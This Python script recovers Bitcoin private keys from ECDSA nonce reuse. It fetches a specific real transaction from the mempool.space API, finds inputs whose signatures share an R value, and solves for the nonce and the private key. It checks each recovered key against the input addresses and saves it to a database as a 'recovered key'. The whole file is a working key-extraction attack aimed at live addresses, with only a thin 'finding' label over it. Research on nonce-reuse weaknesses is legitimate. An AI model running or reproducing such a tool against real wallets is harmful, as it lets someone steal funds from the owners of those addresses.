import requests
import hashlib
import re
import struct
from ecdsa import SECP256k1, SigningKey, VerifyingKey
from ecdsa.util import sigdecode_der
from db_manager import add_finding, add_recovered_key
from tx_preimage_reconstructor import get_real_z

# The common R-collision TX identified
TXID = "c097a280bfed180a99d579053473408b8f0caa1c886bbc819fda65b08d590728"

def fetch_tx_hex(txid):
    url = f"https://mempool.space/api/tx/{txid}/hex"
    resp = requests.get(url)
    if resp.status_code == 200:
        return resp.text.strip()
    return None

def double_sha256(data):
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()

def recover_from_collision(r, s1, s2, z1, z2):
    n = SECP256k1.order
    def inv(a, n):
        return pow(a, n - 2, n)

    # k = (z1 - z2) / (s1 - s2) mod n
    k = ((z1 - z2) * inv(s1 - s2, n)) % n
    # priv = (s1 * k - z1) / r mod n
    priv = ((s1 * k - z1) * inv(r, n)) % n
    return priv, k

if __name__ == "__main__":
    print(f"Analyzing collision in TX: {TXID}")
    
    resp = requests.get(f"https://mempool.space/api/tx/{TXID}")
    if resp.status_code != 200:
        print("Error fetching TX data")
        exit(1)
    tx_data = resp.json()
    
    vins = tx_data.get('vin', [])
    sigs = []
    print(f"Found {len(vins)} inputs. Parsing signatures...")
    for i, vin in enumerate(vins):
        scriptsig = vin.get('scriptsig', '')
        witness = vin.get('witness', [])
        
        candidates = [scriptsig] + witness
        for candidate in candidates:
            if not candidate: continue
            match = re.search(r'30[0-9a-f]{2}02([0-9a-f]{2})([0-9a-f]+)02([0-9a-f]{2})([0-9a-f]+)', candidate)
            if match:
                r_val = match.group(2)
                s_val = match.group(4)
                r_int = int(r_val, 16)
                s_int = int(s_val, 16)
                addr = vin.get('prevout', {}).get('scriptpubkey_address', 'Unknown')
                print(f"Input {i} ({addr}): R={hex(r_int)[:16]}... S={hex(s_int)[:16]}...")
                
                # Compute real Z value for this input
                z_int = get_real_z(TXID, i)
                sigs.append({'r': r_int, 's': s_int, 'addr': addr, 'vin': i, 'z': z_int})

    seen_r = {}
    for sig in sigs:
        if sig['r'] in seen_r:
            prev = seen_r[sig['r']]
            if sig['s'] != prev['s'] and sig['z'] and prev['z']:
                print(f"\n!!! COLLISION FOUND - ATTEMPTING RECOVERY !!!")
                print(f"R: {hex(sig['r'])}")
                print(f"Input {prev['vin']} ({prev['addr']}): S={hex(prev['s'])}, Z={hex(prev['z'])}")
                print(f"Input {sig['vin']} ({sig['addr']}): S={hex(sig['s'])}, Z={hex(sig['z'])}")
                
                priv, k = recover_from_collision(sig['r'], prev['s'], sig['s'], prev['z'], sig['z'])
                priv_hex = hex(priv)[2:].zfill(64)
                
                print(f"\nRecovered k (nonce): {hex(k)}")
                print(f"Recovered private key: {priv_hex}")
                
                # Verify the key against both addresses
                from lattice_nonce_analyzer import verify_key
                for addr in [prev['addr'], sig['addr']]:
                    if verify_key(priv, addr):
                        print(f"  KEY VERIFIED for {addr}")
                        add_recovered_key(addr, priv_hex, method='R-Collision')
                    else:
                        print(f"  Key does NOT match {addr}")
                
                add_finding(sig['addr'], 'R-Collision (Solved)', txid=TXID,
                           details={'r': hex(sig['r']), 'privkey': priv_hex}, severity='Critical')
            elif sig['s'] != prev['s']:
                print(f"\n!!! COLLISION FOUND but missing Z values !!!")
                add_finding(sig['addr'], 'R-Collision', txid=TXID,
                           details={'r': hex(sig['r']), 's1': hex(prev['s']), 's2': hex(sig['s'])}, severity='High')
        seen_r[sig['r']] = sig
